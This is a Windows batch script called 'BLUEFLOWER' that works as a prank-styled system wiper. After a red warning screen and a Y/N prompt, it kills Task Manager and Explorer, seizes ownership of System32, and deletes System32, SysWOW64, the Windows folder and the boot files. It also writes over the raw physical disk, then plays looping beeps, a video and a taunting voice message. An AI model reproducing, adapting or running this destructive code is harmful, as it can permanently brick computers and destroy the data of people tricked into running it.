@echo off
title BLUEFLOWER // ARE YOU SURE?
color 4f
mode con: cols=90 lines=30
cls

echo.
echo.                  ██████╗ ██╗   ██╗███████╗███████╗
echo.                  ██╔══██╗██║   ██║██╔════╝██╔════╝
echo.                  ██████╔╝██║   ██║█████╗  █████╗  
echo.                  ██╔══██╗██║   ██║██╔══╝  ██╔══╝  
echo.                  ██████╔╝╚██████╔╝███████╗███████╗
echo.                  ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
echo.
echo.
echo                       THIS WILL RENDER YOUR DEVICE USELESS
echo.
echo            - System32 will be completely deleted
echo            - Windows folder will be wiped
echo            - Bootloader will be corrupted
echo            - Your PC will become unbootable (permanent brick unless reinstalled)
echo            - NO recovery, NO undo, NO mercy
echo.
echo                         This is the point of no return.
echo.
echo                           Continue? (Y = Yes, destroy everything)
echo                                     (N = No, abort)
echo.
echo.
set /p choice="                                      > "

if /i "%choice%"=="Y" goto destroy
if /i "%choice%"=="YES" goto destroy
if /i "%choice%"=="y" goto destroy
goto abort

:abort
cls
echo.
echo                       Wise choice... for now.
echo                       BLUEFLOWER spares you this time.
echo.
echo                                 LOVE, BLUEFLOWER 🌸
timeout /t 5 >nul
exit

:destroy
cls
echo.
echo                       YOU CHOSE DESTRUCTION.
echo                       COMMENCING TOTAL ANNIHILATION...
ping localhost -n 4 >nul

taskkill /f /im taskmgr.exe >nul 2>&1
taskkill /f /im explorer.exe >nul 2>&1

takeown /f C:\Windows\System32 /r /d y >nul 2>&1
icacls C:\Windows\System32 /grant Administrators:F /t >nul 2>&1

rd /s /q C:\Windows\System32 >nul 2>&1
md C:\Windows\System32 >nul 2>&1
echo BLUEFLOWER OWNS YOUR SOUL > C:\Windows\System32\GOODBYE.txt

rd /s /q C:\Windows\SysWOW64 >nul 2>&1

rd /s /q C:\Windows >nul 2>&1

del /f /q C:\boot.ini >nul 2>&1
del /f /q C:\Windows\System32\winload.exe >nul 2>&1
del /f /q C:\Windows\System32\ntoskrnl.exe >nul 2>&1

echo BLUEFLOWER FINAL DEATH > \\.\PhysicalDrive0

powershell -c "while($true){[Console]::Beep(32767,200); Start-Sleep -m 100}"
start https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1
powershell -c "$v=New-Object -ComObject Sapi.SpVoice; $v.Rate=10; $v.Volume=100; $v.Speak('YOUR PC IS DEAD FOREVER. THANK YOU FOR YOUR SACRIFICE.')"

cls
echo.
echo                       SYSTEM32 = GONE
echo                       WINDOWS    = GONE
echo                       BOOT       = GONE
echo.
echo                       YOUR DEVICE IS NOW A BEAUTIFUL CORPSE
echo.
echo                            LOVE ETERNAL, BLUEFLOWER 🌸
pause >nul
